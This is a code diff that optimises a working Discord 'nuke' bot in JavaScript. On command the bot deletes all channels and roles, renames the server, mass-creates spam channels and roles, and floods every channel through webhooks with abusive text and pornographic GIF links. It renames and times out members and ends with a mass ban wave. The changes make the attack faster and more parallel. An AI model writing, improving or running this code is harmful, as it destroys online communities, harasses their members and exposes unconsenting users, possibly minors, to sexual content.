@@ -16,21 +16,22 @@ const client = new Client({
 const TOKEN = process.env.TOKEN;
 const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
 const PROTECTED_CHANNEL = 'aaaaaaaa';
-const FINAL_TIMEOUT = 28 * 24 * 60 * 60 * 1000; // 28 days
+const FINAL_TIMEOUT = 28 * 24 * 60 * 60 * 1000;
 
 let nukeActive = false;
-let nukeInterval = null;
+let currentMode = 'normal';
+let ticking = false; // prevents overlapping ticks
 let nukeTimeout = null;
-let currentMode = 'normal'; // 'normal' or 'very'
+let loopRunning = false;
+
+// ================== CACHES ==================
+const webhookCache = new Map(); // channelId_name -> webhook
+const memberCache = new Map();  // guildId -> members collection
+const cacheTimers = new Map();
 
 // ================== GIF SLOTS ==================
-const GIF_TYPE_1 = [
-  "https://klipy.com/gifs/orgasm-cumming-1"
-];
-
-const GIF_TYPE_2 = [
-  "https://klipy.com/gifs/vegan-porn-carrot-porn"
-];
+const GIF_TYPE_1 = ["https://klipy.com/gifs/orgasm-cumming-1"];
+const GIF_TYPE_2 = ["https://klipy.com/gifs/vegan-porn-carrot-porn"];
 
 // ================== LISTS ==================
 const SERVER_NAMES = [
@@ -64,7 +65,11 @@ const ROLE_NAMES = [
 ];
 
 const MESSAGES = [
-`@everyone`,`here`
+  '**NUKE MODE**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
+  'OWNED', 'THE END', 'RIP SERVER', 'YOU CANNOT STOP THIS', 'BOT WINS',
+  'GOODBYE', 'MINIONS ARE HELPING', 'ARMY INCOMING', 'TOO MANY WEBHOOKS',
+  'MUTED', 'SILENCE', 'NO ESCAPE', 'ARMY OVERWHELM', 'BOSS RAGE',
+  'FULL PRESSURE', 'PARALLEL DESTRUCTION', 'VERY AGGRESSIVE', 'OVERPOWERED'
 ];
 
 const ARMY_NAMES = [
@@ -75,46 +80,74 @@ const ARMY_NAMES = [
 ];
 
 const ARMY_MESSAGES = [
- `@everyone`,`here`
+  'army reporting', 'wave incoming', 'you are done', 'boss ordered this',
+  'no survivors', 'mute activated', 'gif spam', 'reality break',
+  'webhook army', 'too many of us', 'flooding now', 'we are many',
+  'no hope', 'collapse', 'army online', 'boss is raging', 'full aggro',
+  'multi tasking', 'parallel chaos', 'very aggressive', 'overpowered'
 ];
 
 // ================== HELPERS ==================
 function randomItem(arr) {
-  if (!arr || arr.length === 0) return null;
-  return arr[Math.floor(Math.random() * arr.length)];
+  if (!arr?.length) return null;
+  return arr[(Math.random() * arr.length) | 0];
 }
 
 function chance(percent) {
   return Math.random() * 100 < percent;
 }
 
+function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+
+// Cached member fetch
+async function getMembers(guild) {
+  const key = guild.id;
+  if (memberCache.has(key)) return memberCache.get(key);
+
+  const members = await guild.members.fetch().catch(() => null);
+  if (members) {
+    memberCache.set(key, members);
+    // expire cache after 20s
+    setTimeout(() => memberCache.delete(key), 20000);
+  }
+  return members;
+}
+
+// Cached webhook get/create
 async function getOrCreateWebhook(channel, name = 'Minion') {
+  const key = `${channel.id}_${name}`;
+  if (webhookCache.has(key)) return webhookCache.get(key);
+
   try {
     const webhooks = await channel.fetchWebhooks();
     let webhook = webhooks.find(wh => wh.name === name);
     if (!webhook) {
-      webhook = await channel.createWebhook({ name, reason: 'Webhook Army' });
+      webhook = await channel.createWebhook({ name, reason: 'Nuke Army' });
     }
+    webhookCache.set(key, webhook);
     return webhook;
-  } catch (err) {
+  } catch {
     return null;
   }
 }
 
 async function safeDelete(channel) {
   if (!channel || channel.name === PROTECTED_CHANNEL) return;
-  await channel.delete('NUKE').catch(() => {});
+  return channel.delete('NUKE').catch(() => {});
 }
 
 // ================== FINAL BAN WAVE ==================
 async function finalBanWave(guild) {
   console.log('🔪 FINAL BAN WAVE STARTING...');
-  const members = await guild.members.fetch().catch(() => null);
+  const members = await getMembers(guild);
   if (!members) return;
 
   let banned = 0, timedOut = 0, failed = 0;
 
-  await Promise.all([...members.values()].map(async (member) => {
+  // Parallel ban/timeout attempts
+  await Promise.allSettled([...members.values()].map(async (member) => {
     if (member.user.bot || member.id === guild.ownerId) return;
 
     try {
@@ -123,7 +156,7 @@ async function finalBanWave(guild) {
         banned++;
         return;
       }
-    } catch (e) {}
+    } catch {}
 
     try {
       if (member.moderatable) {
@@ -131,7 +164,7 @@ async function finalBanWave(guild) {
         timedOut++;
         return;
       }
-    } catch (e) {}
+    } catch {}
 
     failed++;
   }));
@@ -139,143 +172,146 @@ async function finalBanWave(guild) {
   console.log(`✅ FINAL WAVE → Banned: ${banned} | Timed out: ${timedOut} | Failed: ${failed}`);
 }
 
-// ================== BOSS ACTIONS ==================
+// ================== BOSS ACTIONS (optimized) ==================
 const bossActions = [
+  // Rename server
   async (guild) => {
-    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
+    guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
   },
 
+  // Mass delete channels (parallel)
   async (guild) => {
     const channels = [...guild.channels.cache.values()];
-    await Promise.all(channels.map(ch => safeDelete(ch)));
+    await Promise.allSettled(channels.map(ch => safeDelete(ch)));
   },
 
+  // Mass create channels (parallel)
   async (guild) => {
-    const count = currentMode === 'very' ? 18 : 12;
-    const tasks = [];
-    for (let i = 0; i < count; i++) {
-      tasks.push(
-        guild.channels.create({
-          name: randomItem(CHANNEL_NAMES),
-          type: ChannelType.GuildText,
-        }).then(ch => ch.send(randomItem(MESSAGES)).catch(() => {})).catch(() => {})
-      );
-    }
-    await Promise.all(tasks);
-  },
-
-  async (guild) => {
-    const count = currentMode === 'very' ? 10 : 6;
-    const tasks = [];
-    for (let i = 0; i < count; i++) {
-      tasks.push(
-        guild.channels.create({
-          name: randomItem(['temp', 'flash', 'glitch', 'rage', 'aggro', 'op', 'kill']),
-          type: ChannelType.GuildText,
-        }).then(async ch => {
-          await ch.send('👁').catch(() => {});
-          setTimeout(() => ch.delete().catch(() => {}), 1200 + Math.random() * 2000);
-        }).catch(() => {})
-      );
-    }
-    await Promise.all(tasks);
-  },
-
-  async (guild) => {
-    const roles = [...guild.roles.cache.values()];
-    await Promise.all(
-      roles.filter(r => r.id !== guild.id && r.editable)
-           .map(r => r.delete('NUKE').catch(() => {}))
+    const count = currentMode === 'very' ? 16 : 11;
+    const tasks = Array.from({ length: count }, () =>
+      guild.channels.create({
+        name: randomItem(CHANNEL_NAMES),
+        type: ChannelType.GuildText,
+      })
+        .then(ch => ch.send(randomItem(MESSAGES)).catch(() => {}))
+        .catch(() => {})
     );
+    await Promise.allSettled(tasks);
   },
 
+  // Temp flash channels
   async (guild) => {
-    const count = currentMode === 'very' ? 14 : 9;
-    const tasks = [];
-    for (let i = 0; i < count; i++) {
-      tasks.push(
-        guild.roles.create({
-          name: randomItem(ROLE_NAMES),
-          color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
-          reason: 'NUKE',
-        }).catch(() => {})
-      );
-    }
-    await Promise.all(tasks);
+    const count = currentMode === 'very' ? 9 : 6;
+    const tasks = Array.from({ length: count }, () =>
+      guild.channels.create({
+        name: randomItem(['temp', 'flash', 'glitch', 'rage', 'op', 'kill']),
+        type: ChannelType.GuildText,
+      })
+        .then(async ch => {
+          ch.send('👁').catch(() => {});
+          setTimeout(() => ch.delete().catch(() => {}), 1000 + Math.random() * 2000);
+        })
+        .catch(() => {})
+    );
+    await Promise.allSettled(tasks);
   },
 
+  // Delete roles (parallel)
   async (guild) => {
-    const members = await guild.members.fetch().catch(() => null);
+    const roles = [...guild.roles.cache.values()].filter(r => r.id !== guild.id && r.editable);
+    await Promise.allSettled(roles.map(r => r.delete('NUKE').catch(() => {})));
+  },
+
+  // Create roles (parallel)
+  async (guild) => {
+    const count = currentMode === 'very' ? 13 : 8;
+    const tasks = Array.from({ length: count }, () =>
+      guild.roles.create({
+        name: randomItem(ROLE_NAMES),
+        color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
+        reason: 'NUKE',
+      }).catch(() => {})
+    );
+    await Promise.allSettled(tasks);
+  },
+
+  // Nickname hell (parallel + cached members)
+  async (guild) => {
+    const members = await getMembers(guild);
     if (!members) return;
-    await Promise.all(
+    await Promise.allSettled(
       [...members.values()]
         .filter(m => !m.user.bot && m.manageable)
         .map(m => m.setNickname(randomItem(NICKNAMES)).catch(() => {}))
     );
   },
 
+  // Mute hell (parallel)
   async (guild) => {
-    const members = await guild.members.fetch().catch(() => null);
+    const members = await getMembers(guild);
     if (!members) return;
-    await Promise.all(
+    const times = currentMode === 'very'
+      ? [3600, 7200, 14400, 28800]
+      : [1800, 3600, 7200, 14400];
+
+    await Promise.allSettled(
       [...members.values()]
         .filter(m => !m.user.bot && m.moderatable)
         .map(m => {
-          const times = currentMode === 'very'
-            ? [3600, 7200, 14400, 28800]
-            : [1800, 3600, 7200, 14400];
-          const time = times[Math.floor(Math.random() * times.length)] * 1000;
+          const time = times[(Math.random() * times.length) | 0] * 1000;
           return m.timeout(time, 'NUKE').catch(() => {});
         })
     );
   },
 
+  // Message spam (parallel)
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
       c.type === ChannelType.GuildText &&
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
     );
-    const spamCount = currentMode === 'very' ? 10 : 6;
+    const spam = currentMode === 'very' ? 8 : 5;
     const tasks = [];
     for (const channel of channels.values()) {
-      for (let i = 0; i < spamCount; i++) {
+      for (let i = 0; i < spam; i++) {
         tasks.push(channel.send(randomItem(MESSAGES)).catch(() => {}));
       }
     }
-    await Promise.all(tasks);
+    await Promise.allSettled(tasks);
   },
 
+  // Permission lock (parallel)
   async (guild) => {
     const channels = guild.channels.cache.filter(c => c.manageable);
-    await Promise.all(
+    await Promise.allSettled(
       [...channels.values()].map(channel =>
         channel.permissionOverwrites.edit(guild.roles.everyone, {
-          ViewChannel: chance(currentMode === 'very' ? 3 : 8),
+          ViewChannel: chance(currentMode === 'very' ? 3 : 7),
           SendMessages: false,
           Connect: false,
           Speak: false,
           AddReactions: false,
           AttachFiles: false,
-          EmbedLinks: false,
         }).catch(() => {})
       )
     );
   },
 
+  // Bot nick
   async (guild) => {
-    await guild.members.me.setNickname(randomItem([
+    guild.members.me.setNickname(randomItem([
       currentMode === 'very' ? 'VERY AGGRESSIVE' : 'NUKE',
-      'OVERPOWERED', 'PARALLEL CHAOS', 'BOSS RAGE',
-      'ARMY COMMANDER', 'OVERLORD', 'THE DESTROYER'
+      'OVERPOWERED', 'PARALLEL CHAOS', 'BOSS RAGE', 'OVERLORD', 'THE DESTROYER'
     ])).catch(() => {});
   },
 
+  // Role assign hell
   async (guild) => {
-    const members = await guild.members.fetch().catch(() => null);
+    const members = await getMembers(guild);
     const roles = [...guild.roles.cache.filter(r => r.editable && r.id !== guild.id).values()];
-    if (!members || roles.length === 0) return;
+    if (!members || !roles.length) return;
 
-    await Promise.all(
+    await Promise.allSettled(
       [...members.values()]
         .filter(m => !m.user.bot && m.manageable)
         .map(m => {
@@ -286,120 +322,134 @@ const bossActions = [
   },
 ];
 
-// ================== WEBHOOK ARMY ==================
+// ================== ARMY ACTIONS (optimized) ==================
 const armyActions = [
+  // Heavy GIF army
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
       c.type === ChannelType.GuildText &&
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
     );
 
-    const nameCount = currentMode === 'very' ? 14 : 9;
-    const spamPer = currentMode === 'very' ? 5 : 3;
+    const nameCount = currentMode === 'very' ? 12 : 8;
+    const perWebhook = currentMode === 'very' ? 4 : 2;
 
     const tasks = [];
     for (const channel of channels.values()) {
       for (const name of ARMY_NAMES.slice(0, nameCount)) {
         tasks.push((async () => {
-          const webhook = await getOrCreateWebhook(channel, name);
-          if (!webhook) return;
-          for (let i = 0; i < spamPer; i++) {
+          const wh = await getOrCreateWebhook(channel, name);
+          if (!wh) return;
+          const sends = Array.from({ length: perWebhook }, () => {
             const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
-            await webhook.send({
-              content: gif || randomItem(ARMY_MESSAGES),
-              username: name,
-            }).catch(() => {});
-          }
+            return wh.send({ content: gif || randomItem(ARMY_MESSAGES), username: name }).catch(() => {});
+          });
+          await Promise.allSettled(sends);
         })());
       }
     }
-    await Promise.all(tasks);
+    await Promise.allSettled(tasks);
   },
 
+  // Text flood army
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
       c.type === ChannelType.GuildText &&
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
     );
 
-    const loops = currentMode === 'very' ? 10 : 6;
+    const loops = currentMode === 'very' ? 8 : 5;
     const tasks = [];
     for (const channel of channels.values()) {
       for (let i = 0; i < loops; i++) {
         tasks.push((async () => {
-          const webhook = await getOrCreateWebhook(channel, randomItem(ARMY_NAMES));
-          if (!webhook) return;
-          await webhook.send({
+          const wh = await getOrCreateWebhook(channel, randomItem(ARMY_NAMES));
+          if (!wh) return;
+          await wh.send({
             content: randomItem(ARMY_MESSAGES),
             username: randomItem(ARMY_NAMES),
           }).catch(() => {});
         })());
       }
     }
-    await Promise.all(tasks);
+    await Promise.allSettled(tasks);
   },
 
+  // Army creates spam channels
   async (guild) => {
-    const count = currentMode === 'very' ? 8 : 5;
-    const tasks = [];
-    for (let i = 0; i < count; i++) {
-      tasks.push((async () => {
-        try {
-          const ch = await guild.channels.create({
-            name: randomItem(['army-spam', 'op-wave', 'flood-zone', 'aggro', 'very']),
-            type: ChannelType.GuildText,
-          });
-          for (const name of ARMY_NAMES.slice(0, 5)) {
-            const webhook = await getOrCreateWebhook(ch, name);
-            if (!webhook) continue;
-            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
-            await webhook.send({
-              content: gif || randomItem(ARMY_MESSAGES),
-              username: name,
-            }).catch(() => {});
-          }
-        } catch (e) {}
-      })());
-    }
-    await Promise.all(tasks);
+    const count = currentMode === 'very' ? 7 : 4;
+    const tasks = Array.from({ length: count }, () => (async () => {
+      try {
+        const ch = await guild.channels.create({
+          name: randomItem(['army-spam', 'op-wave', 'flood', 'aggro', 'very']),
+          type: ChannelType.GuildText,
+        });
+        const inner = ARMY_NAMES.slice(0, 4).map(async name => {
+          const wh = await getOrCreateWebhook(ch, name);
+          if (!wh) return;
+          const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
+          return wh.send({ content: gif || randomItem(ARMY_MESSAGES), username: name }).catch(() => {});
+        });
+        await Promise.allSettled(inner);
+      } catch {}
+    })());
+    await Promise.allSettled(tasks);
   },
 
+  // Symbol spam
   async (guild) => {
     const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
-    const tasks = [];
-    for (const channel of channels.values()) {
-      tasks.push((async () => {
-        const webhook = await getOrCreateWebhook(channel, 'Glitch');
-        if (!webhook) return;
-        await webhook.send({
-          content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌', '🩸']),
-          username: randomItem(['Glitch', 'Null', 'Error', 'Void', 'Rage']),
-        }).catch(() => {});
-      })());
-    }
-    await Promise.all(tasks);
+    const tasks = [...channels.values()].map(async channel => {
+      const wh = await getOrCreateWebhook(channel, 'Glitch');
+      if (!wh) return;
+      await wh.send({
+        content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌', '🩸']),
+        username: randomItem(['Glitch', 'Null', 'Error', 'Void', 'Rage']),
+      }).catch(() => {});
+    });
+    await Promise.allSettled(tasks);
   },
 ];
 
-// ================== TICK ==================
+// ================== OPTIMIZED TICK ==================
 async function runNukeTick(guild) {
-  if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) return;
+  if (!guild || ticking) return;
+  if (!guild.members.me?.permissions?.has(PermissionFlagsBits.Administrator)) return;
 
-  const bossCount = currentMode === 'very' ? 13 : 9;
-  const armyCount = currentMode === 'very' ? 6 : 4;
+  ticking = true;
+  const start = Date.now();
 
-  console.log(`\n======== ${currentMode.toUpperCase()} MODE TICK on ${guild.name} ========`);
+  const bossCount = currentMode === 'very' ? 12 : 8;
+  const armyCount = currentMode === 'very' ? 5 : 3;
 
-  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, bossCount);
-  const selectedArmy = [...armyActions].sort(() => 0.5 - Math.random()).slice(0, armyCount);
+  const selectedBoss = [...bossActions].sort(() => Math.random() - 0.5).slice(0, bossCount);
+  const selectedArmy = [...armyActions].sort(() => Math.random() - 0.5).slice(0, armyCount);
 
-  await Promise.all([
-    ...selectedBoss.map(a => a(guild).catch(e => console.error('❌ Boss:', e.message))),
-    ...selectedArmy.map(a => a(guild).catch(e => console.error('❌ Army:', e.message))),
+  // Everything in parallel
+  await Promise.allSettled([
+    ...selectedBoss.map(fn => fn(guild)),
+    ...selectedArmy.map(fn => fn(guild)),
   ]);
+
+  console.log(`⚡ ${currentMode.toUpperCase()} tick done in ${Date.now() - start}ms`);
+  ticking = false;
 }
 
-// ================== START NUKE ==================
+// ================== NON-OVERLAPPING LOOP ==================
+async function nukeLoop(guild) {
+  const interval = currentMode === 'very' ? 1800 : 3500;
+
+  while (nukeActive) {
+    const start = Date.now();
+    await runNukeTick(guild);
+
+    const elapsed = Date.now() - start;
+    const delay = Math.max(interval - elapsed, 200);
+    await sleep(delay);
+  }
+}
+
+// ================== START / STOP ==================
 async function startNuke(guild, message, mode = 'normal') {
   if (nukeActive) {
     if (message) await message.reply('⚠️ Nuke already running.');
@@ -408,50 +458,42 @@ async function startNuke(guild, message, mode = 'normal') {
 
   currentMode = mode;
   nukeActive = true;
-
-  const isVery = mode === 'very';
-  const duration = 5 * 60 * 1000;
-  const interval = isVery ? 2.2 * 1000 : 4 * 1000; // VERY mode is much faster
+  memberCache.delete(guild.id); // fresh members
 
   if (message) {
     await message.reply(
-      isVery
-        ? '💣 **VERY AGGRESSIVE MODE STARTED**\nFaster ticks + heavier parallel load.'
-        : '💣 **NORMAL AGGRESSIVE MODE STARTED**'
+      mode === 'very'
+        ? '💣 **VERY AGGRESSIVE MODE**\nFaster loop + heavier parallel load.'
+        : '💣 **NORMAL AGGRESSIVE MODE**'
     );
   }
 
-  console.log(`💣 NUKE STARTED → Mode: ${mode.toUpperCase()}`);
+  console.log(`💣 NUKE STARTED → ${mode.toUpperCase()}`);
 
-  await runNukeTick(guild);
+  // Start non-overlapping loop
+  nukeLoop(guild);
 
-  nukeInterval = setInterval(async () => {
-    if (!nukeActive) return clearInterval(nukeInterval);
-    await runNukeTick(guild);
-  }, interval);
-
+  // 5 minute end + ban wave
   nukeTimeout = setTimeout(async () => {
     nukeActive = false;
-    clearInterval(nukeInterval);
-    console.log('⏰ 5 MINUTES OVER → FINAL BAN WAVE');
+    console.log('⏰ 5 MIN OVER → FINAL BAN WAVE');
     await finalBanWave(guild);
-    console.log('🛑 NUKE FULLY ENDED');
-  }, duration);
+    console.log('🛑 NUKE ENDED');
+  }, 5 * 60 * 1000);
 }
 
 // ================== EVENTS ==================
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
-  console.log(`💣 DUAL MODE NUKE BOT READY`);
-  console.log(`→ !nuke  = Normal Aggressive`);
-  console.log(`→ !NUKE  = VERY Aggressive (faster + heavier)`);
+  console.log(`💣 OPTIMIZED DUAL-MODE NUKE READY`);
+  console.log(`→ !nuke  = Normal`);
+  console.log(`→ !NUKE  = VERY Aggressive (faster)`);
 });
 
 client.on('messageCreate', async (message) => {
   if (message.author.bot || !message.guild) return;
-  if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;
+  if (!message.member?.permissions?.has(PermissionFlagsBits.Administrator)) return;
 
-  // Exact match for casing
   if (message.content === '!NUKE') {
     await startNuke(message.guild, message, 'very');
   } else if (message.content === '!nuke') {
@@ -460,7 +502,6 @@ client.on('messageCreate', async (message) => {
 
   if (message.content === '!nuke-stop' || message.content === '!NUKE-STOP') {
     nukeActive = false;
-    if (nukeInterval) clearInterval(nukeInterval);
     if (nukeTimeout) clearTimeout(nukeTimeout);
     await message.reply('🛑 Nuke stopped.');
   }
